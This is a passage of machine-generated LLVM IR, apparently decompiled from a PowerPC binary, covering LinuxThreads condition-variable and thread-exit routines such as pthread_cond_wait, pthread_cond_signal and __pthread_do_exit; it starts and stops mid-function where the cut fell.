  store i32 %v0_10005014, i32* @r3, align 4
  store i32 268455964, i32* @lr, align 4
  %v0_10005018 = call i32 @__pthread_unlock()
  %v0_1000501c = load i32, i32* @r29, align 4
  %v3_1000501c = icmp eq i32 %v0_1000501c, 0
  br i1 %v3_1000501c, label %dec_label_pc_10005034, label %dec_label_pc_10005024

dec_label_pc_10005024:                            ; preds = %dec_label_pc_10005014
  store i32 ptrtoint (i32* @global_var_10005030.185 to i32), i32* @lr, align 4
  %v2_1000502c = call i32 @__pthread_set_own_extricate_if(i32 %v0_10004f84, i32 0)
  br label %dec_label_pc_100050fc

dec_label_pc_10005034:                            ; preds = %dec_label_pc_10005014
  %v0_10005034 = load i32, i32* @r30, align 4
  store i32 %v0_10005034, i32* @r3, align 4
  store i32 0, i32* @r28, align 4
  store i32 268456000, i32* @lr, align 4
  %v0_1000503c = call i32 @pthread_mutex_unlock()
  %v1_1000509c = add i32 %v0_10004f84, 440
  %v2_1000509c = inttoptr i32 %v1_1000509c to i8*
  %v1_100050ac = add i32 %v0_10004f84, 64
  %v2_100050ac = inttoptr i32 %v1_100050ac to i8*
  br label %dec_label_pc_10005040

dec_label_pc_10005040:                            ; preds = %dec_label_pc_100050b8, %dec_label_pc_10005034
  %v0_10005044 = load i32, i32* @r27, align 4
  store i32 268456012, i32* @lr, align 4
  %v2_10005048 = inttoptr i32 %v0_10005044 to i32*
  %v3_10005048 = call i32 @__pthread_timedsuspend_new(i32 %v0_10004f84, i32* %v2_10005048)
  %v3_1000504c = icmp eq i32 %v3_10005048, 0
  br i1 %v3_1000504c, label %dec_label_pc_10005054, label %dec_label_pc_10005088

dec_label_pc_10005054:                            ; preds = %dec_label_pc_10005040
  store i32 %v0_10004f84, i32* @r4, align 4
  %v0_10005058 = load i32, i32* @r31, align 4
  store i32 %v0_10005058, i32* @r3, align 4
  store i32 268456032, i32* @lr, align 4
  %v0_1000505c = call i32 @__pthread_lock()
  %v0_10005060 = load i32, i32* @r31, align 4
  %v1_10005060 = add i32 %v0_10005060, 8
  store i32 %v1_10005060, i32* @r3, align 4
  %v2_10005068 = call i32 @remove_from_queue(i32 %v1_10005060, i32 %v0_10004f84)
  %v0_10005070 = load i32, i32* @r31, align 4
  store i32 %v0_10005070, i32* @r3, align 4
  store i32 268456056, i32* @lr, align 4
  %v0_10005074 = call i32 @__pthread_unlock()
  %v3_10005078 = icmp eq i32 %v2_10005068, 0
  br i1 %v3_10005078, label %dec_label_pc_10005080, label %dec_label_pc_10005108

dec_label_pc_10005080:                            ; preds = %dec_label_pc_10005054
  store i32 %v0_10004f84, i32* @r3, align 4
  store i32 268456072, i32* @lr, align 4
  %v1_10005084 = call i32 @suspend.1(i32 %v0_10004f84)
  br label %dec_label_pc_10005088

dec_label_pc_10005088:                            ; preds = %dec_label_pc_10005040, %dec_label_pc_10005080
  %v3_1000508c = load i8, i8* %v4_10004fc8, align 1
  %v3_10005090 = icmp eq i8 %v3_1000508c, 0
  br i1 %v3_10005090, label %dec_label_pc_10005098, label %dec_label_pc_100050c0

dec_label_pc_10005098:                            ; preds = %dec_label_pc_10005088
  %v3_1000509c = load i8, i8* %v2_1000509c, align 1
  %v3_100050a0 = icmp eq i8 %v3_1000509c, 0
  br i1 %v3_100050a0, label %dec_label_pc_100050b8, label %dec_label_pc_100050a8

dec_label_pc_100050a8:                            ; preds = %dec_label_pc_10005098
  %v3_100050ac = load i8, i8* %v2_100050ac, align 1
  %v3_100050b0 = icmp eq i8 %v3_100050ac, 0
  br i1 %v3_100050b0, label %dec_label_pc_100050c0, label %dec_label_pc_100050b8

dec_label_pc_100050b8:                            ; preds = %dec_label_pc_100050a8, %dec_label_pc_10005098
  %v0_100050b8 = load i32, i32* @r28, align 4
  %v1_100050b8 = add i32 %v0_100050b8, 1
  store i32 %v1_100050b8, i32* @r28, align 4
  br label %dec_label_pc_10005040

dec_label_pc_100050c0:                            ; preds = %dec_label_pc_10005088, %dec_label_pc_100050a8
  store i32 268456140, i32* @lr, align 4
  %v2_100050c8 = call i32 @__pthread_set_own_extricate_if(i32 %v0_10004f84, i32 0)
  %v3_100050d0 = load i8, i8* %v2_1000509c, align 1
  %v3_100050d4 = icmp eq i8 %v3_100050d0, 0
  br i1 %v3_100050d4, label %dec_label_pc_1000512c.preheader, label %dec_label_pc_100050dc

dec_label_pc_100050dc:                            ; preds = %dec_label_pc_100050c0
  %v3_100050e0 = load i8, i8* %v2_100050ac, align 1
  %v3_100050e4 = icmp eq i8 %v3_100050e0, 0
  br i1 %v3_100050e4, label %dec_label_pc_100050ec, label %dec_label_pc_1000512c.preheader

dec_label_pc_1000512c.preheader:                  ; preds = %dec_label_pc_100050c0, %dec_label_pc_100050dc
  %v0_1000512c1 = load i32, i32* @r28, align 4
  %v3_1000512c4 = icmp eq i32 %v0_1000512c1, 0
  %v1_100051306 = add i32 %v0_1000512c1, -1
  store i32 %v1_100051306, i32* %r28.global-to-local, align 4
  br i1 %v3_1000512c4, label %dec_label_pc_10005138, label %dec_label_pc_10005124

dec_label_pc_100050ec:                            ; preds = %dec_label_pc_100050dc
  %v0_100050f0 = load i32, i32* @r30, align 4
  store i8 0, i8* %v2_1000509c, align 1
  store i32 268456188, i32* @lr, align 4
  %v1_100050f8 = call i32 @pthread_mutex_lock(i32 %v0_100050f0)
  br label %dec_label_pc_100050fc

dec_label_pc_100050fc:                            ; preds = %dec_label_pc_10005024, %dec_label_pc_100050ec
  %v0_10005104 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10005108

dec_label_pc_10005108:                            ; preds = %dec_label_pc_10005054, %dec_label_pc_100050fc
  store i32 268456212, i32* @lr, align 4
  %v2_10005110 = call i32 @__pthread_set_own_extricate_if(i32 %v0_10004f84, i32 0)
  %v0_10005114 = load i32, i32* @r30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000511c.186 to i32), i32* @lr, align 4
  %v1_10005118 = call i32 @pthread_mutex_lock(i32 %v0_10005114)
  br label %dec_label_pc_10005144

dec_label_pc_10005124:                            ; preds = %dec_label_pc_1000512c.preheader, %dec_label_pc_10005124
  store i32 %v0_10004f84, i32* @r3, align 4
  store i32 268456236, i32* @lr, align 4
  %v1_10005128 = call i32 @restart(i32 %v0_10004f84)
  %v0_1000512c = load i32, i32* %r28.global-to-local, align 4
  %v3_1000512c = icmp eq i32 %v0_1000512c, 0
  %v1_10005130 = add i32 %v0_1000512c, -1
  store i32 %v1_10005130, i32* %r28.global-to-local, align 4
  br i1 %v3_1000512c, label %dec_label_pc_10005138, label %dec_label_pc_10005124

dec_label_pc_10005138:                            ; preds = %dec_label_pc_10005124, %dec_label_pc_1000512c.preheader
  %v0_10005138 = load i32, i32* @r30, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005140.187 to i32), i32* @lr, align 4
  %v1_1000513c = call i32 @pthread_mutex_lock(i32 %v0_10005138)
  br label %dec_label_pc_10005144

dec_label_pc_10005144:                            ; preds = %dec_label_pc_10004f98, %dec_label_pc_10005108, %dec_label_pc_10005138
  %v0_10005154 = phi i32 [ 22, %dec_label_pc_10004f98 ], [ 110, %dec_label_pc_10005108 ], [ 0, %dec_label_pc_10005138 ]
  ret i32 %v0_10005154

; uselistorder directives
  uselistorder i8* %v2_1000509c, { 1, 0, 2 }
  uselistorder i32 %v0_10004f84, { 7, 6, 5, 8, 12, 11, 13, 14, 15, 9, 10, 4, 16, 3, 2, 18, 17, 19, 20, 0, 21, 1 }
  uselistorder i32* %r28.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005144, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10005124, { 1, 0 }
  uselistorder label %dec_label_pc_10005108, { 1, 0 }
  uselistorder label %dec_label_pc_100050fc, { 1, 0 }
  uselistorder label %dec_label_pc_1000512c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100050c0, { 1, 0 }
  uselistorder label %dec_label_pc_10005088, { 1, 0 }
  uselistorder label %dec_label_pc_10005014, { 1, 0 }
}

define i32 @__GI_pthread_cond_wait(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %arg1, i32* @r31, align 4
  %v1_10005170 = add i32 %arg2, 12
  %v2_10005170 = inttoptr i32 %v1_10005170 to i32*
  %v3_10005170 = load i32, i32* %v2_10005170, align 4
  %v0_10005174 = load i32, i32* @r2, align 4
  %v3_10005178 = icmp eq i32 %v3_10005170, 3
  br i1 %v3_10005178, label %dec_label_pc_1000519c, label %dec_label_pc_10005180

dec_label_pc_10005180:                            ; preds = %entry
  %v3_10005180 = icmp eq i32 %v3_10005170, 0
  br i1 %v3_10005180, label %dec_label_pc_1000519c, label %dec_label_pc_10005188

dec_label_pc_10005188:                            ; preds = %dec_label_pc_10005180
  %v1_10005190 = add i32 %arg2, 8
  %v2_10005190 = inttoptr i32 %v1_10005190 to i32*
  %v3_10005190 = load i32, i32* %v2_10005190, align 4
  %v4_10005194 = icmp eq i32 %v3_10005190, %v0_10005174
  br i1 %v4_10005194, label %dec_label_pc_1000519c, label %dec_label_pc_100052d8

dec_label_pc_1000519c:                            ; preds = %dec_label_pc_10005188, %dec_label_pc_10005180, %entry
  store i32 %v0_10005174, i32* @r11, align 4
  %v2_100051b0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v3_100051b8 = add i32 %v0_10005174, 441
  %v4_100051b8 = inttoptr i32 %v3_100051b8 to i8*
  store i8 0, i8* %v4_100051b8, align 1
  store i32 268456388, i32* @lr, align 4
  %v2_100051c0 = call i32 @__pthread_set_own_extricate_if(i32 %v0_10005174, i32 %v2_100051b0)
  %v0_100051c4 = load i32, i32* @r31, align 4
  store i32 %v0_100051c4, i32* @r3, align 4
  store i32 %v0_10005174, i32* @r4, align 4
  store i32 268456400, i32* @lr, align 4
  %v0_100051cc = call i32 @__pthread_lock()
  store i32 %v0_10005174, i32* @r9, align 4
  %v1_100051d4 = add i32 %v0_10005174, 66
  %v2_100051d4 = inttoptr i32 %v1_100051d4 to i8*
  %v3_100051d4 = load i8, i8* %v2_100051d4, align 1
  %v3_100051d8 = icmp eq i8 %v3_100051d4, 0
  br i1 %v3_100051d8, label %dec_label_pc_100051f4, label %dec_label_pc_100051e0

dec_label_pc_100051e0:                            ; preds = %dec_label_pc_1000519c
  store i32 %v0_10005174, i32* @r9, align 4
  store i32 1, i32* %r30.global-to-local, align 4
  %v1_100051e8 = add i32 %v0_10005174, 64
  %v2_100051e8 = inttoptr i32 %v1_100051e8 to i8*
  %v3_100051e8 = load i8, i8* %v2_100051e8, align 1
  %v3_100051ec = icmp eq i8 %v3_100051e8, 0
  br i1 %v3_100051ec, label %dec_label_pc_10005204, label %dec_label_pc_100051f4

dec_label_pc_100051f4:                            ; preds = %dec_label_pc_100051e0, %dec_label_pc_1000519c
  %v0_100051f8 = load i32, i32* @r31, align 4
  %v1_100051f8 = add i32 %v0_100051f8, 8
  store i32 0, i32* %r30.global-to-local, align 4
  %v2_10005200 = call i32 @enqueue(i32 %v1_100051f8, i32 %v0_10005174)
  br label %dec_label_pc_10005204

dec_label_pc_10005204:                            ; preds = %dec_label_pc_100051e0, %dec_label_pc_100051f4
  %v0_10005204 = load i32, i32* @r31, align 4
  store i32 %v0_10005204, i32* @r3, align 4
  store i32 268456460, i32* @lr, align 4
  %v0_10005208 = call i32 @__pthread_unlock()
  %v0_1000520c = load i32, i32* %r30.global-to-local, align 4
  %v3_1000520c = icmp eq i32 %v0_1000520c, 0
  br i1 %v3_1000520c, label %dec_label_pc_10005224, label %dec_label_pc_10005214

dec_label_pc_10005214:                            ; preds = %dec_label_pc_10005204
  store i32 ptrtoint (i32* @global_var_10005220.188 to i32), i32* @lr, align 4
  %v2_1000521c = call i32 @__pthread_set_own_extricate_if(i32 %v0_10005174, i32 0)
  br label %dec_label_pc_100052ac

dec_label_pc_10005224:                            ; preds = %dec_label_pc_10005204
  %v0_10005224 = load i32, i32* @r29, align 4
  store i32 %v0_10005224, i32* @r3, align 4
  store i32 268456496, i32* @lr, align 4
  %v0_1000522c = call i32 @pthread_mutex_unlock()
  %v1_1000524c = add i32 %v0_10005174, 440
  %v2_1000524c = inttoptr i32 %v1_1000524c to i8*
  %v1_1000525c = add i32 %v0_10005174, 64
  %v2_1000525c = inttoptr i32 %v1_1000525c to i8*
  store i32 %v0_10005174, i32* @r3, align 4
  store i32 268456504, i32* @lr, align 4
  %v1_100052347 = call i32 @suspend.1(i32 %v0_10005174)
  %v3_1000523c8 = load i8, i8* %v4_100051b8, align 1
  %v3_1000524011 = icmp eq i8 %v3_1000523c8, 0
  br i1 %v3_1000524011, label %dec_label_pc_10005248, label %dec_label_pc_10005270

dec_label_pc_10005248:                            ; preds = %dec_label_pc_10005224, %dec_label_pc_10005268
  %v3_1000524c = load i8, i8* %v2_1000524c, align 1
  %v3_10005250 = icmp eq i8 %v3_1000524c, 0
  br i1 %v3_10005250, label %dec_label_pc_10005268, label %dec_label_pc_10005258

dec_label_pc_10005258:                            ; preds = %dec_label_pc_10005248
  %v3_1000525c = load i8, i8* %v2_1000525c, align 1
  %v3_10005260 = icmp eq i8 %v3_1000525c, 0
  br i1 %v3_10005260, label %dec_label_pc_10005270, label %dec_label_pc_10005268

dec_label_pc_10005268:                            ; preds = %dec_label_pc_10005258, %dec_label_pc_10005248
  store i32 %v0_10005174, i32* @r3, align 4
  store i32 268456504, i32* @lr, align 4
  %v1_10005234 = call i32 @suspend.1(i32 %v0_10005174)
  %v3_1000523c = load i8, i8* %v4_100051b8, align 1
  %v3_10005240 = icmp eq i8 %v3_1000523c, 0
  br i1 %v3_10005240, label %dec_label_pc_10005248, label %dec_label_pc_10005270

dec_label_pc_10005270:                            ; preds = %dec_label_pc_10005258, %dec_label_pc_10005268, %dec_label_pc_10005224
  store i32 268456572, i32* @lr, align 4
  %v2_10005278 = call i32 @__pthread_set_own_extricate_if(i32 %v0_10005174, i32 0)
  %v3_10005280 = load i8, i8* %v2_1000524c, align 1
  %v3_10005284 = icmp eq i8 %v3_10005280, 0
  br i1 %v3_10005284, label %dec_label_pc_100052c0, label %dec_label_pc_1000528c

dec_label_pc_1000528c:                            ; preds = %dec_label_pc_10005270
  %v3_10005290 = load i8, i8* %v2_1000525c, align 1
  %v3_10005294 = icmp eq i8 %v3_10005290, 0
  br i1 %v3_10005294, label %dec_label_pc_1000529c, label %dec_label_pc_100052c0

dec_label_pc_1000529c:                            ; preds = %dec_label_pc_1000528c
  %v0_100052a0 = load i32, i32* @r29, align 4
  store i8 0, i8* %v2_1000524c, align 1
  store i32 268456620, i32* @lr, align 4
  %v1_100052a8 = call i32 @pthread_mutex_lock(i32 %v0_100052a0)
  br label %dec_label_pc_100052ac

dec_label_pc_100052ac:                            ; preds = %dec_label_pc_10005214, %dec_label_pc_1000529c
  %v0_100052b4 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_100052b8

dec_label_pc_100052b8:                            ; preds = %dec_label_pc_100052c0, %dec_label_pc_100052ac
  store i32 %v0_10005174, i32* @r3, align 4
  store i32 268456640, i32* @lr, align 4
  %v1_100052bc = call i32 @restart(i32 %v0_10005174)
  br label %dec_label_pc_100052c0

dec_label_pc_100052c0:                            ; preds = %dec_label_pc_1000528c, %dec_label_pc_10005270, %dec_label_pc_100052b8
  %v0_100052c0 = load i32, i32* @r31, align 4
  %v3_100052c0 = icmp eq i32 %v0_100052c0, 0
  %v1_100052c4 = add i32 %v0_100052c0, -1
  store i32 %v1_100052c4, i32* @r31, align 4
  br i1 %v3_100052c0, label %dec_label_pc_100052cc, label %dec_label_pc_100052b8

dec_label_pc_100052cc:                            ; preds = %dec_label_pc_100052c0
  %v0_100052cc = load i32, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100052d4.189 to i32), i32* @lr, align 4
  %v1_100052d0 = call i32 @pthread_mutex_lock(i32 %v0_100052cc)
  br label %dec_label_pc_100052d8

dec_label_pc_100052d8:                            ; preds = %dec_label_pc_10005188, %dec_label_pc_100052cc
  %v0_100052e8 = phi i32 [ 22, %dec_label_pc_10005188 ], [ 0, %dec_label_pc_100052cc ]
  ret i32 %v0_100052e8

; uselistorder directives
  uselistorder i8* %v2_1000524c, { 1, 0, 2 }
  uselistorder i8* %v4_100051b8, { 1, 0, 2 }
  uselistorder i32 %v0_10005174, { 8, 7, 9, 13, 12, 0, 1, 10, 11, 6, 14, 5, 4, 17, 16, 15, 18, 2, 19, 3 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @suspend.1, { 1, 0, 2 }
  uselistorder i32 268456504, { 1, 0 }
  uselistorder i32 (i32, i32)* @__pthread_set_own_extricate_if, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100052d8, { 1, 0 }
  uselistorder label %dec_label_pc_100052c0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100052ac, { 1, 0 }
  uselistorder label %dec_label_pc_10005270, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10005248, { 1, 0 }
  uselistorder label %dec_label_pc_10005204, { 1, 0 }
}

define i32 @cond_extricate_func(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_100052f4 = load i32, i32* @r2, align 4
  store i32 %arg2, i32* @r29, align 4
  store i32 %v0_100052f4, i32* @r4, align 4
  store i32 %arg1, i32* %r28.global-to-local, align 4
  store i32 268456720, i32* @lr, align 4
  %v0_1000530c = call i32 @__pthread_lock()
  %v0_10005310 = load i32, i32* @r29, align 4
  %v1_10005314 = add i32 %arg1, 8
  store i32 %v1_10005314, i32* @r3, align 4
  %v2_10005318 = call i32 @remove_from_queue(i32 %v1_10005314, i32 %v0_10005310)
  %v0_10005320 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10005320, i32* @r3, align 4
  store i32 268456744, i32* @lr, align 4
  %v0_10005324 = call i32 @__pthread_unlock()
  ret i32 %v2_10005318

; uselistorder directives
  uselistorder i32 (i32, i32)* @remove_from_queue, { 1, 0 }
}

define i32 @pthread_cond_signal(i32 %arg1) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %v0_10005348 = call i32 @__asm_mfcr()
  store i32 %v0_10005348, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 268456804, i32* @lr, align 4
  %v0_10005360 = call i32 @__pthread_lock()
  %v0_10005364 = load i32, i32* @r30, align 4
  %v1_10005364 = add i32 %v0_10005364, 8
  %v2_10005364 = inttoptr i32 %v1_10005364 to i32*
  %v3_10005364 = load i32, i32* %v2_10005364, align 4
  store i32 %v3_10005364, i32* @r31, align 4
  store i32 %v0_10005364, i32* @r3, align 4
  %v3_1000536c = icmp eq i32 %v3_10005364, 0
  store i1 %v3_1000536c, i1* %cr4_eq.global-to-local, align 1
  br i1 %v3_1000536c, label %dec_label_pc_10005384, label %dec_label_pc_10005374

dec_label_pc_10005374:                            ; preds = %entry
  %v1_10005374 = add i32 %v3_10005364, 8
  %v2_10005374 = inttoptr i32 %v1_10005374 to i32*
  %v3_10005374 = load i32, i32* %v2_10005374, align 4
  store i32 %v3_10005374, i32* %v2_10005364, align 4
  %v1_10005380 = load i32, i32* @r31, align 4
  %v2_10005380 = add i32 %v1_10005380, 8
  %v3_10005380 = inttoptr i32 %v2_10005380 to i32*
  store i32 0, i32* %v3_10005380, align 4
  br label %dec_label_pc_10005384

dec_label_pc_10005384:                            ; preds = %entry, %dec_label_pc_10005374
  store i32 268456840, i32* @lr, align 4
  %v0_10005384 = call i32 @__pthread_unlock()
  %v0_10005388 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10005388, label %dec_label_pc_100053a0, label %dec_label_pc_1000538c

dec_label_pc_1000538c:                            ; preds = %dec_label_pc_10005384
  %v2_10005390 = load i32, i32* @r31, align 4
  %v3_10005390 = add i32 %v2_10005390, 441
  %v4_10005390 = inttoptr i32 %v3_10005390 to i8*
  store i8 1, i8* %v4_10005390, align 1
  %v0_10005398 = load i32, i32* @r31, align 4
  store i32 %v0_10005398, i32* @r3, align 4
  store i32 268456864, i32* @lr, align 4
  %v1_1000539c = call i32 @restart(i32 %v0_10005398)
  br label %dec_label_pc_100053a0

dec_label_pc_100053a0:                            ; preds = %dec_label_pc_10005384, %dec_label_pc_1000538c
  %v1_100053b4 = call %0 @__asm_mtcrf(i32 8, i32 %v0_10005348)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32)* @restart, { 3, 0, 2, 1 }
  uselistorder i32 441, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_100053a0, { 1, 0 }
  uselistorder label %dec_label_pc_10005384, { 1, 0 }
}

define i32 @__linuxthreads_create_event(i32 %arg1) local_unnamed_addr {
entry:
  %v0_100053c0 = load i32, i32* @r3, align 4
  ret i32 %v0_100053c0
}

define i32 @__linuxthreads_death_event(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_100053c4 = load i32, i32* @r3, align 4
  ret i32 %v0_100053c4
}

define i32 @__linuxthreads_reap_event(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_100053c8 = load i32, i32* @r3, align 4
  ret i32 %v0_100053c8
}

define i32 @__pthread_set_own_extricate_if.2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_100053cc = call i32 @__asm_mfcr()
  store i32 %v0_100053cc, i32* %r3.global-to-local, align 4
  %v3_100053d0 = icmp eq i32 %arg2, 0
  store i1 %v3_100053d0, i1* %cr4_eq.global-to-local, align 1
  store i32 %arg2, i32* @r30, align 4
  store i32 %v0_100053cc, i32* @r31, align 4
  store i32 %v0_100053cc, i32* @r4, align 4
  br i1 %v3_100053d0, label %dec_label_pc_10005410, label %dec_label_pc_100053f8

dec_label_pc_100053f8:                            ; preds = %entry
  %v1_100053f8 = add i32 %v0_100053cc, 64
  %v2_100053f8 = inttoptr i32 %v1_100053f8 to i8*
  %v3_100053f8 = load i8, i8* %v2_100053f8, align 1
  %v3_100053fc = icmp eq i8 %v3_100053f8, 0
  br i1 %v3_100053fc, label %dec_label_pc_10005410.thread, label %dec_label_pc_10005420

dec_label_pc_10005410.thread:                     ; preds = %dec_label_pc_100053f8
  %v2_100054104 = add i32 %v0_100053cc, 444
  %v3_100054105 = inttoptr i32 %v2_100054104 to i32*
  store i32 %arg2, i32* %v3_100054105, align 4
  br label %dec_label_pc_10005420

dec_label_pc_10005410:                            ; preds = %entry
  %v1_10005408 = add i32 %v0_100053cc, 28
  %v2_10005408 = inttoptr i32 %v1_10005408 to i32*
  %v3_10005408 = load i32, i32* %v2_10005408, align 4
  store i32 %v3_10005408, i32* @r3, align 4
  store i32 268456976, i32* @lr, align 4
  %v0_1000540c = call i32 @__pthread_lock()
  store i32 %v0_1000540c, i32* %r3.global-to-local, align 4
  %v0_10005410.pre = load i32, i32* @r30, align 4
  %v1_10005410.pre = load i32, i32* @r31, align 4
  %v0_10005414.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v2_10005410 = add i32 %v1_10005410.pre, 444
  %v3_10005410 = inttoptr i32 %v2_10005410 to i32*
  store i32 %v0_10005410.pre, i32* %v3_10005410, align 4
  br i1 %v0_10005414.pre, label %dec_label_pc_10005418, label %dec_label_pc_10005420

dec_label_pc_10005418:                            ; preds = %dec_label_pc_10005410
  %v0_10005418 = load i32, i32* @r31, align 4
  %v1_10005418 = add i32 %v0_10005418, 28
  %v2_10005418 = inttoptr i32 %v1_10005418 to i32*
  %v3_10005418 = load i32, i32* %v2_10005418, align 4
  store i32 %v3_10005418, i32* @r3, align 4
  store i32 268456992, i32* @lr, align 4
  %v0_1000541c = call i32 @__pthread_unlock()
  store i32 %v0_1000541c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005420

dec_label_pc_10005420:                            ; preds = %dec_label_pc_10005410.thread, %dec_label_pc_10005410, %dec_label_pc_100053f8, %dec_label_pc_10005418
  %v1_10005430 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100053cc)
  %v0_10005438 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10005438

; uselistorder directives
  uselistorder i32 %v0_100053cc, { 5, 4, 0, 3, 2, 1, 6 }
  uselistorder i32* %r3.global-to-local, { 3, 2, 4, 0, 1 }
  uselistorder label %dec_label_pc_10005420, { 3, 1, 0, 2 }
}

define i32 @suspend.3(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268457036, i32* @lr, align 4
  %v0_10005448 = call i32 @__pthread_wait_for_restart_signal()
  ret i32 %v0_10005448
}

define i32 @__pthread_do_exit() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %v0_10005468 = load i32, i32* @r3, align 4
  store i32 %v0_10005468, i32* %r29.global-to-local, align 4
  %v2_10005474 = load i32, i32* @r2, align 4
  %v3_10005474 = add i32 %v2_10005474, 64
  %v4_10005474 = inttoptr i32 %v3_10005474 to i8*
  store i8 1, i8* %v4_10005474, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1000547c = load i32, i32* @r2, align 4
  %v3_1000547c = add i32 %v2_1000547c, 65
  %v4_1000547c = inttoptr i32 %v3_1000547c to i8*
  store i8 0, i8* %v4_1000547c, align 1
  %v0_10005480 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1000548c.190 to i32), i32* @lr, align 4
  %v1_10005488 = call i32 @__pthread_perform_cleanup(i32 %v0_10005480)
  store i32 268457104, i32* @lr, align 4
  %v1_1000548c = call i32 @__pthread_destroy_specifics(i32 %v1_10005488)
  %v0_10005490 = load i32, i32* @r31, align 4
  %v1_10005490 = add i32 %v0_10005490, 28
  %v2_10005490 = inttoptr i32 %v1_10005490 to i32*
  %v3_10005490 = load i32, i32* %v2_10005490, align 4
  store i32 %v3_10005490, i32* @r3, align 4
  store i32 %v0_10005490, i32* @r4, align 4
  store i32 268457116, i32* @lr, align 4
  %v0_10005498 = call i32 @__pthread_lock()
  store i32 %v0_10005498, i32* @r3, align 4
  %v0_1000549c = load i32, i32* @r31, align 4
  %v1_1000549c = add i32 %v0_1000549c, 412
  %v2_1000549c = inttoptr i32 %v1_1000549c to i32*
  %v3_1000549c = load i32, i32* %v2_1000549c, align 4
  store i32 %v3_1000549c, i32* %r0.global-to-local, align 4
  %v0_100054a0 = load i32, i32* @r29, align 4
  %v2_100054a0 = add i32 %v0_1000549c, 48
  %v3_100054a0 = inttoptr i32 %v2_100054a0 to i32*
  store i32 %v0_100054a0, i32* %v3_100054a0, align 4
  %v0_100054a4 = load i32, i32* %r0.global-to-local, align 4
  %v3_100054a4 = icmp eq i32 %v0_100054a4, 0
  br i1 %v3_100054a4, label %dec_label_pc_100054dc, label %dec_label_pc_100054ac

dec_label_pc_100054ac:                            ; preds = %entry
  %v3_100054b0 = load i32, i32* @global_var_1002c35c.154, align 4
  store i32 %v3_100054b0, i32* %r0.global-to-local, align 4
  %v0_100054b4 = load i32, i32* @r31, align 4
  %v1_100054b4 = add i32 %v0_100054b4, 416
  %v2_100054b4 = inttoptr i32 %v1_100054b4 to i32*
  %v3_100054b4 = load i32, i32* %v2_100054b4, align 4
  %v2_100054b8 = or i32 %v3_100054b4, %v3_100054b0
  store i32 %v2_100054b8, i32* %r0.global-to-local, align 4
  %v1_100054bc = and i32 %v2_100054b8, 256
  %v3_100054bc = icmp eq i32 %v1_100054bc, 0
  br i1 %v3_100054bc, label %dec_label_pc_100054dc, label %dec_label_pc_100054c4

dec_label_pc_100054c4:                            ; preds = %dec_label_pc_100054ac
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_100054c8 = add i32 %v0_100054b4, 428
  %v3_100054c8 = inttoptr i32 %v2_100054c8 to i32*
  store i32 %v0_100054b4, i32* %v3_100054c8, align 4
  %v0_100054cc = load i32, i32* %r0.global-to-local, align 4
  %v1_100054cc = load i32, i32* @r31, align 4
  %v2_100054cc = add i32 %v1_100054cc, 424
  %v3_100054cc = inttoptr i32 %v2_100054cc to i32*
  store i32 %v0_100054cc, i32* %v3_100054cc, align 4
  %v0_100054d4 = load i32, i32* @r31, align 4
  store i32 %v0_100054d4, i32* @global_var_1002c364.162, align 4
  %v2_100054d8 = call i32 @__linuxthreads_death_event(i32 %v0_10005498, i32 ptrtoint (i32* @global_var_10030000.11 to i32))
  br label %dec_label_pc_100054dc

dec_label_pc_100054dc:                            ; preds = %dec_label_pc_100054ac, %entry, %dec_label_pc_100054c4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_100054e0 = load i32, i32* @r31, align 4
  %v1_100054e0 = add i32 %v0_100054e0, 56
  %v2_100054e0 = inttoptr i32 %v1_100054e0 to i32*
  %v3_100054e0 = load i32, i32* %v2_100054e0, align 4
  store i32 %v3_100054e0, i32* %r29.global-to-local, align 4
  %v3_100054e4 = add i32 %v0_100054e0, 44
  %v4_100054e4 = inttoptr i32 %v3_100054e4 to i8*
  store i8 1, i8* %v4_100054e4, align 1
  %v0_100054e8 = load i32, i32* @r31, align 4
  %v1_100054e8 = add i32 %v0_100054e8, 28
  %v2_100054e8 = inttoptr i32 %v1_100054e8 to i32*
  %v3_100054e8 = load i32, i32* %v2_100054e8, align 4
  store i32 %v3_100054e8, i32* @r3, align 4
